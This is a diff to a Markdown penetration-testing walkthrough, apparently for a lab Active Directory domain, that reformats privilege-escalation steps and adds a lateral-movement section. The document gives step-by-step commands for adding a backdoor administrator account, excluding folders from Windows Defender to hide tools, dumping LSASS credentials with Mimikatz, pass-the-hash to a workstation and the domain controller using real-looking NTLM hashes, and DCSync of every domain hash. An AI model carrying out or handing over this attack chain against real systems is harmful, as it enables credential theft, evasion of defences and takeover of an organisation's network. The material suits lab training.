@@ -28,6 +28,14 @@ Megacorp, a very large company, has recently acquired several SMEs (Small and Me
   - [Defense Evasion](#defense-evasion)
     - [Folder Exclusion in Windows Defender UI](#folder-exclusion-in-windows-defender-ui)
     - [Folder Exclusion in Windows Defender PowerShell](#folder-exclusion-in-windows-defender-powershell)
+  - [Lateral Movement](#lateral-movement)
+    - [Get Mimikatz](#get-mimikatz)
+    - [Get Sysinternals Suite](#get-sysinternals-suite)
+    - [Using Pass-the-Hash (PTH) Attack](#using-pass-the-hash-pth-attack)
+    - [Transferring Tools](#transferring-tools)
+    - [Extract the Domain Admin NTLM Hash](#extract-the-domain-admin-ntlm-hash)
+    - [Use Pass-the-Hash to Access the Domain Controller](#use-pass-the-hash-to-access-the-domain-controller)
+      - [Dump All Hashes from Active Directory](#dump-all-hashes-from-active-directory)
 
 ## Task Overview
 
@@ -236,6 +244,7 @@ These services run with **Local System** privileges, presenting potential privil
 Check for misconfigured scheduled tasks that can escalate privileges.
 
 1. **Go to the Folder**:
+
    - Open the **Tasks Migrated** folder by running:
 
      ```bash
@@ -243,6 +252,7 @@ Check for misconfigured scheduled tasks that can escalate privileges.
      ```
 
 2. **List the Files**:
+
    - See what's inside by typing:
 
      ```bash
@@ -250,7 +260,7 @@ Check for misconfigured scheduled tasks that can escalate privileges.
      ```
 
    - You’ll see files representing scheduled tasks, for example:
-  
+
      ```bash
      pinger
      MicrosoftEdgeUpdateTaskMachineCore
@@ -258,6 +268,7 @@ Check for misconfigured scheduled tasks that can escalate privileges.
      ```
 
 3. **View Task Details**:
+
    - Use the `type` command to look inside a task. For example:
 
      ```bash
@@ -265,6 +276,7 @@ Check for misconfigured scheduled tasks that can escalate privileges.
      ```
 
    This shows information about who runs the task and what it does. Key things to look for:
+
    - **Author**: The user who created the task (e.g., `Administrator`).
    - **Triggers**: When the task runs (e.g., at logon).
    - **Actions**: The command it runs (e.g., `pinger.bat` script).
@@ -321,31 +333,31 @@ The Remote Mouse application lets us open an administrator command prompt.
 
 4. **Verify Privileges:**
 
-    ```bash
-    C:\Users\normaluser> whoami
-    nt authority\system
-    ```
+   ```bash
+   C:\Users\normaluser> whoami
+   nt authority\system
+   ```
 
 5. **Create Admin User:**
 
-    To create a new administrator account, use the following command:
+   To create a new administrator account, use the following command:
 
-    ```bash
-    net user <username> <password> /add && net localgroup administrators <username> /add
-    ```
+   ```bash
+   net user <username> <password> /add && net localgroup administrators <username> /add
+   ```
 
-    **Example:**
+   **Example:**
 
-    ```bash
-    net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
-    ```
+   ```bash
+   net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
+   ```
 
-    - **username**: The desired name for the new account (e.g., `helpdesk`).
-    - **password**: The password for the new account (e.g., `L3tm3!n`).
+   - **username**: The desired name for the new account (e.g., `helpdesk`).
+   - **password**: The password for the new account (e.g., `L3tm3!n`).
 
-    **Result:**
+   **Result:**
 
-    This command creates a new user with the specified credentials and adds it to the **Administrators** group, granting elevated privileges.
+   This command creates a new user with the specified credentials and adds it to the **Administrators** group, granting elevated privileges.
 
 ---
 
@@ -424,7 +436,7 @@ We can change the service's executable path in the registry.
 
 2. **Navigate to Service Key:**
 
-     `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc`
+   `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc`
 
 3. **Edit `ImagePath`:**
 
@@ -460,7 +472,7 @@ We have write access to the service executable.
    sc qc filepermsvc
    ```
 
-    **BINARY_PATH_NAME:** `"C:\Program Files\File Permissions Service\filepermservice.exe"`
+   **BINARY_PATH_NAME:** `"C:\Program Files\File Permissions Service\filepermservice.exe"`
 
 2. **Check Folder Permissions:**
 
@@ -622,7 +634,7 @@ The `daclsvc` service has improper permissions that allow unauthorized users to 
 2. **Modify Service Path:**
 
    - Use the following command to change the binary path of the service to execute a command that creates a new user and adds them to the administrators group:
-  
+
      ```bash
      sc config daclsvc binPath= "cmd.exe /c net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add"
      ```
@@ -645,6 +657,7 @@ We have identified a scheduled task running under an administrative account, and
 **Steps:**
 
 1. **Check File and Folder Permissions**:
+
    - Ensure you can edit the script or file that the task runs by checking the permissions with the following command:
 
      ```bash
@@ -677,6 +690,7 @@ We have identified a scheduled task running under an administrative account, and
      - Here, **BUILTIN\Users** have **(F)** (Full Control) on the folder, meaning you can add, delete, or modify files in this directory, even though the specific file `pinger.bat` cannot be modified directly.
 
 2. **Bypass File Restrictions**:
+
    - Since you cannot directly modify `pinger.bat`, you can delete the `C:\temp` folder entirely and recreate it with your own script. First, delete the `C:\temp` folder:
 
      ```bash
@@ -694,6 +708,7 @@ We have identified a scheduled task running under an administrative account, and
      ```
 
 3. **Run the Scheduled Task**:
+
    - If the task is set to run at logon, simply log off and back on to trigger it. Alternatively, run the task manually with:
 
      ```bash
@@ -707,7 +722,7 @@ We have identified a scheduled task running under an administrative account, and
 Check if the `helpdesk` user has been added with administrative privileges:
 
 ```bash
-net user 
+net user
 net user helpdesk
 net localgroup administrator
 ```
@@ -760,13 +775,16 @@ Avoid being detected by security tools like antivirus programs by exclude folder
 Follow these steps to exclude a folder from Windows Defender scans using the Windows interface:
 
 1. **Open Windows Security:**
+
    - Go to the **Start menu** and search for **Windows Security**.
    - Click on **Virus & threat protection**.
 
 2. **Manage Settings:**
+
    - Scroll down and click on **Manage settings** under **Virus & threat protection settings**.
 
 3. **Add Exclusions:**
+
    - Scroll to **Exclusions** and click **Add or remove exclusions**.
 
 4. **Exclude a Folder:**
@@ -774,7 +792,7 @@ Follow these steps to exclude a folder from Windows Defender scans using the Win
    - Select the folder you want to exclude and confirm.
 
 > **Note:** When logging into the system with the local administrator account (e.g., "helpdesk") via the Windows login screen, you must use the **"dot backslash" (`.\`)** notation to specify a local user account rather than a domain account. For example, to log in as the local "helpdesk" account, enter:  
-`.\helpdesk`. This ensures the login is processed against the local **Security Accounts Manager (SAM)** database instead of the domain's Active Directory.
+> `.\helpdesk`. This ensures the login is processed against the local **Security Accounts Manager (SAM)** database instead of the domain's Active Directory.
 
 ---
 
@@ -783,9 +801,11 @@ Follow these steps to exclude a folder from Windows Defender scans using the Win
 You can also exclude folders using PowerShell. Here’s how:
 
 1. **Open PowerShell as Administrator:**
+
    - Right-click the **Start menu**, choose **Windows PowerShell (Admin)**.
 
 2. **Add a Folder Exclusion:**
+
    - Type this command, replacing `"C:\Path\To\Your\Folder"` with the folder you want to exclude:
 
      ```powershell
@@ -793,6 +813,7 @@ You can also exclude folders using PowerShell. Here’s how:
      ```
 
 3. **Check Exclusions:**
+
    - To see the excluded folders, type:
 
      ```powershell
@@ -800,6 +821,7 @@ You can also exclude folders using PowerShell. Here’s how:
      ```
 
 4. **Remove a Folder Exclusion (Optional):**
+
    - If you need to remove an exclusion, use this command:
 
      ```powershell
@@ -809,3 +831,461 @@ You can also exclude folders using PowerShell. Here’s how:
 > **Note:** There is a patch that prevents excluding the root `C:\` drive using PowerShell. However, this can be bypassed by excluding a specific folder within `C:\`, such as `C:\Temp`, as the patch only blocks exclusions ending with `C:\`, not folders inside it.
 
 ---
+
+## Lateral Movement
+
+Lateral movement is an important step in an attack, where the attacker moves from one system to another in the network. This usually happens after they get initial access and increase their privileges on a hacked machine. Here, we'll look at ways to move through the network quietly to reach key targets, like the Domain Controller (DC) or admin computers.
+
+### Get Mimikatz
+
+download, extract, and prepare **mimikatz**
+
+1. **Download Mimikatz ZIP File**
+
+   In **cmd**, use the `curl` command to download the file:
+
+   ```bash
+      curl -o mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+   ```
+
+   In **PowerShell**, use `Invoke-WebRequest`:
+
+   ```powershell
+      Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
+   ```
+
+   Both commands will download the file from the specified URL and save it as `mimikatz.zip` in the current directory.
+
+2. **Create Destination Folder** (If Needed)
+
+   If the destination folder does not exist, you can create it before extracting the archive.
+
+   In **cmd**, use `mkdir`:
+
+   ```bash
+      mkdir C:\temp\mimikatz
+   ```
+
+   In **PowerShell**, use `New-Item`:
+
+   ```powershell
+      New-Item -Path "C:\temp\mimikatz" -ItemType Directory
+   ```
+
+   After creating the folder, you can proceed to extract the archive into it.
+
+3. **Extract ZIP File**
+
+   In **cmd**, use `tar` to extract the ZIP file (this works on Windows 10 and later):
+
+   ```bash
+      tar -xf mimikatz.zip -C C:\temp\mimikatz
+   ```
+
+   In **PowerShell**, use `Expand-Archive` to extract the ZIP file:
+
+   ```powershell
+      Expand-Archive -Path "mimikatz.zip" -DestinationPath "C:\temp\mimikatz"
+   ```
+
+   This command extracts the contents of `mimikatz.zip` into the specified folder (`C:\temp`). Make sure to replace the path with your desired location.
+
+---
+
+### Get Sysinternals Suite
+
+**Sysinternals** provides a suite of tools useful for lateral movement and system investigation.
+
+1. **Download Sysinternals ZIP File**
+
+   In **cmd**, use `curl` to download the **Sysinternals Suite**:
+
+   ```bash
+      curl -o SysinternalsSuite.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
+   ```
+
+   In **PowerShell**, use `Invoke-WebRequest` to download the suite:
+
+   ```powershell
+      Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "SysinternalsSuite.zip"
+   ```
+
+   Both commands will download the **Sysinternals Suite** and save it as `SysinternalsSuite.zip`.
+
+2. **Create Destination Folder** (If Needed)
+
+   If the folder for **Sysinternals** does not exist, create it before extracting:
+
+   In **cmd**, use `mkdir`:
+
+   ```bash
+      mkdir C:\temp\Sysinternals
+   ```
+
+   In **PowerShell**, use `New-Item`:
+
+   ```powershell
+      New-Item -Path "C:\temp\Sysinternals" -ItemType Directory
+   ```
+
+3. **Extract Sysinternals ZIP File**
+
+   In **cmd**, use `tar` to extract the **SysinternalsSuite.zip** file:
+
+   ```bash
+      tar -xf SysinternalsSuite.zip -C C:\temp\Sysinternals
+   ```
+
+   In **PowerShell**, use `Expand-Archive` to extract the contents:
+
+   ```powershell
+      Expand-Archive -Path "SysinternalsSuite.zip" -DestinationPath "C:\temp\Sysinternals"
+   ```
+
+   This extracts the **Sysinternals Suite** into the `C:\temp\Sysinternals` folder for further use.
+
+---
+
+### Using Pass-the-Hash (PTH) Attack
+
+We'll perform a pass-the-hash (PtH) attack using Mimikatz to move laterally from `win10client.ADLAB.local` (192.168.56.40) to `win10adm` (192.168.56.30). The Administrator account uses the same password on both machines, allowing us to reuse the NTLM hash for authentication.
+
+**Prerequisites:**
+
+- Administrative privileges on `win10client`.
+- Mimikatz executable available on `win10client`.
+
+**Step 1: Extract the NTLM Hash with Mimikatz**
+First, we need to dump the NTLM hash of the Administrator account on `win10client`.
+
+**Command:**
+
+1. Open an elevated command prompt (Run as Administrator).
+2. Navigate to the directory containing `mimikatz.exe`.
+3. Run Mimikatz:
+
+   ```text
+       C:\temp\mimikatz\X64> .\mimikatz.exe
+
+        .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+       .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+       ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+       ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+       '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+        '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+      mimikatz #
+   ```
+
+4. In the Mimikatz console, enable debug privileges:
+
+   ```bash
+       privilege::debug
+   ```
+
+5. Dump the credentials from LSASS:
+
+   ```bash
+       sekurlsa::logonpasswords
+   ```
+
+**Explanation:**
+
+- `privilege::debug`: Grants the necessary privileges to access system processes.
+- `sekurlsa::logonpasswords`: Extracts authentication material from the Local Security Authority Subsystem Service (LSASS).
+
+**Output Interpretation:**
+
+Look for the Administrator account details:
+
+```text
+         * Username : Administrator
+         * Domain   : WIN10CLIENT
+         * NTLM     : af992895db0f2c42a1bc96546e92804a
+```
+
+> **Note:** the NTLM hash value; we'll use it in the next step.
+
+---
+
+**Step 2: Perform Pass-the-Hash to Create a New Session**
+Use the extracted NTLM hash to create a new session that impersonates the Administrator account.
+
+**Command:**
+
+In the Mimikatz console:
+
+```bash
+sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:<NTLM_HASH> /run:cmd.exe
+```
+
+**Replace `<NTLM_HASH>` with the actual hash extracted earlier.**
+
+**Explanation:**
+
+- `sekurlsa::pth`: Initiates a pass-the-hash attack.
+- `/user`: The username to impersonate.
+- `/domain`: The domain or local machine name.
+- `/ntlm`: The NTLM hash of the user's password.
+- `/run`: The process to execute under the impersonated account (e.g., `cmd.exe`).
+
+**Result:**
+
+A new command prompt opens with the security context of the Administrator account using the supplied NTLM hash.
+
+**Step 3: Lateral Movement to win10adm**
+With the new Administrator session, attempt to access `win10adm` remotely.
+
+**Verification: Using SMB to List Remote Shares:**
+
+```bash
+    dir \\192.168.56.30\C$
+```
+
+**Explanation:**
+
+- Attempts to list the contents of the `C$` administrative share on `win10adm`.
+
+**Using PsExec for a Remote Shell:**
+**Prerequisite:** Download PsExec from [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite).
+
+**Command:**
+
+```bash
+psexec.exe -r processname /accepteula \\192.168.56.30 cmd.exe
+```
+
+**Explanation:**
+
+- `psexec.exe`: Executes processes on remote systems.
+- `\\192.168.56.30`: Specifies the target machine.
+- `-r processname`: Provides a custom process name to bypass restrictions.
+- `cmd.exe`: The command to execute on the remote system.
+
+**Achieved Result:**
+
+- A command prompt running on `win10adm` will open.
+- You can now execute commands directly on the admin workstation.
+
+We've demonstrated how to use Mimikatz for a pass-the-hash attack to achieve lateral movement from `win10client` to `win10adm` by exploiting a reused Administrator password.
+
+---
+
+### Transferring Tools
+
+In this process, we will use **Mimikatz** to facilitate lateral movement between two systems: `win10client` (192.168.56.40) and `win10adm` (192.168.56.30). We'll open two command prompt windows from the **Mimikatz** session on `win10client`. One of these command prompt windows will use **PsExec** to escalate privileges and become the `win10adm` administrator. We will refer to these command prompt windows throughout the documentation as **win10client** and **win10adm**, respectively.
+
+1. **Create a Temporary Directory on `win10adm`:**
+
+   - Create a directory to store and execute the tools you’ll transfer.
+
+   **Command (win10adm Window):**
+
+   ```bash
+     mkdir C:\temp
+   ```
+
+   **Explanation:**
+
+   - This creates a directory called `C:\temp` on `win10adm` to store tools like **Mimikatz**.
+
+2. **Exclude the Temporary Directory from Antivirus Scanning:**
+
+   - Add the newly created directory to Windows Defender’s exclusion list to avoid detection of the tools.
+
+   **Command (win10adm Window):**
+
+   ```bash
+    powershell -c "Add-MpPreference -ExclusionPath 'C:\temp'"
+   ```
+
+   **Explanation:**
+
+   - `Add-MpPreference`: Modifies Windows Defender preferences.
+   - `-ExclusionPath`: Specifies `C:\temp` as an exclusion from antivirus scanning, helping to avoid detection of the tools.
+
+3. **Map the `C$` Administrative Share of `win10adm`:**
+
+   - Map the `C$` administrative share of `win10adm` to a local drive (`X:`) on `win10client` to enable file transfers.
+
+   **Command (win10client Window):**
+
+   ```bash
+     net use x: \\192.168.56.30\C$
+   ```
+
+   **Explanation:**
+
+   - `net use`: Maps a network share.
+   - `X:`: Assigns the `C$` administrative share on `win10adm` to drive `X:` on `win10client`.
+
+4. **Navigate to the Temporary Directory on `win10adm`:**
+
+   - After mapping the `C$` share, change the directory on `win10adm` to the temporary folder (`C:\temp`) created earlier.
+
+   **Command (win10client Window):**
+
+   ```bash
+     X:
+     cd X:\temp
+   ```
+
+   **Explanation:**
+
+   - `X:`: Switches to the mapped `X:` drive, which corresponds to the `C$` share on `win10adm`.
+   - `cd X:\temp`: Navigates to the `C:\temp` directory on `win10adm`.
+
+5. **Transfer Tools to `win10adm`:**
+
+   - Copy the **Mimikatz** executable (or other necessary tools) from `win10client` to `C:\temp` on `win10adm`.
+
+   **Command (win10client Window):**
+
+   ```bash
+     copy C:\path\to\mimikatz\x64\* X:\temp\
+   ```
+
+   **Explanation:**
+
+   - `copy`: Copies files from the specified source directory (`C:\path\to\mimikatz\x64\*`) to `C:\temp` on `win10adm` via the mapped drive.
+
+6. **Execute Mimikatz on `win10adm`:**
+
+   - Once the tools are transferred, execute **Mimikatz** on `win10adm` to perform actions such as credential dumping or pass-the-hash attacks.
+
+   **Command (win10adm Window):**
+
+   ```bash
+     C:\temp\mimikatz.exe
+   ```
+
+   **Explanation:**
+
+   - This command runs **Mimikatz** from the temporary directory on `win10adm`, allowing you to perform further exploitation, such as dumping credentials or lateral movement.
+
+> **Note:** After performing step 5, execute step 6 as soon as possible. Defender may detect **Mimikatz** during transfer, but executing it quickly locks the file, making it harder for Defender to remove.
+
+---
+
+### Extract the Domain Admin NTLM Hash
+
+**Extract the NTLM Hash with Mimikatz**
+We need to dump the NTLM hash of the **Domain** Administrator account on `win10adm`.
+
+**Command:**
+
+1. Run Mimikatz:
+
+   ```text
+       C:\temp\mimikatz\X64> .\mimikatz.exe
+
+        .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+       .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+       ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+       ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+       '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+        '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+      mimikatz #
+   ```
+
+2. In the Mimikatz console, enable debug privileges:
+
+   ```bash
+       privilege::debug
+   ```
+
+3. Dump the credentials from LSASS:
+
+   ```bash
+       sekurlsa::logonpasswords
+   ```
+
+**Explanation:**
+
+- `privilege::debug`: Grants the necessary privileges to access system processes.
+- `sekurlsa::logonpasswords`: Extracts authentication material from the Local Security Authority Subsystem Service (LSASS).
+
+**Output Interpretation:**
+
+Look for the Administrator account details:
+
+```text
+         * Username : domad
+         * Domain   : ADLAB
+         * NTLM     : cff48581d56085119bddffacfae51aeb
+```
+
+> **Note:** the NTLM hash value & close the win10adm window
+
+---
+
+### Use Pass-the-Hash to Access the Domain Controller
+
+Now that we have the NTLM hash of the **Domain Admin** account (`domad`), we can use the **Pass-the-Hash (PTH)** attack to gain access to the Domain Controller (DC) and dump all Active Directory (AD) hashes. Follow the steps below:
+
+1. **Run Pass-the-Hash with Mimikatz**:
+   In the Mimikatz console (still on the compromised workstation), execute the **Pass-the-Hash** attack by running:
+
+   ```bash
+   sekurlsa::pth /user:domad /domain:adlab.local /ntlm:cff48581d56085119bddffacfae51aeb /run:cmd.exe
+   ```
+
+   **Explanation**:
+
+   - `sekurlsa::pth`: Initiates the pass-the-hash attack.
+   - `/user:domad`: Username of the Domain Admin account.
+   - `/domain:adlab.local`: The domain name.
+   - `/ntlm:cff48581d56085119bddffacfae51aeb`: The NTLM hash of the **domad** account.
+   - `/run:cmd.exe`: This opens a new command prompt under the context of the **domad** account.
+
+   A new command prompt should open as **domad**. Now, verify your access to the Domain Controller by trying to access its administrative share:
+
+2. **List the contents of the Domain Controller’s C$ share**:
+
+   ```bash
+      dir \\192.168.56.10\c$
+   ```
+
+   **Explanation**:
+
+   - `192.168.56.10` is the IP address of the Domain Controller.
+   - `C$` is the administrative share.
+
+   If you see the directory contents, the **Pass-the-Hash** was successful, and you have administrative access to the Domain Controller.
+
+#### Dump All Hashes from Active Directory
+
+Now that you have administrative access to the Domain Controller, run **Mimikatz** to dump all the password hashes stored in Active Directory.
+
+1. **Run Mimikatz**:
+   Navigate to the location of **Mimikatz**:
+
+   ```bash
+      C:\temp\mimikatz.exe
+   ```
+
+2. **Enable Privilege Debugging**:
+   Once Mimikatz is running, enable the necessary privileges to access sensitive memory locations:
+
+   ```bash
+   privilege::debug
+   ```
+
+3. **Dump All AD Hashes Using DCSync**:
+   Execute the **DCSync** command to dump the password hashes for all users in the domain:
+
+   ```bash
+   lsadump::dcsync /domain:adlab.local /all /csv
+   ```
+
+   **Explanation**:
+
+   - `lsadump::dcsync`: Extracts password hashes from the Domain Controller without touching the disk.
+   - `/domain:adlab.local`: Specifies the target domain.
+   - `/all`: Dumps password hashes for all domain users.
+   - `/csv`: Outputs the results in CSV format for easy processing.
+
+   The output will include all user account details, including their **NTLM** password hashes, which you can use for further attacks or analysis.
+
+With all the domain hashes at your disposal, you effectively control the entire network, completing the objective of gaining full domain dominance.
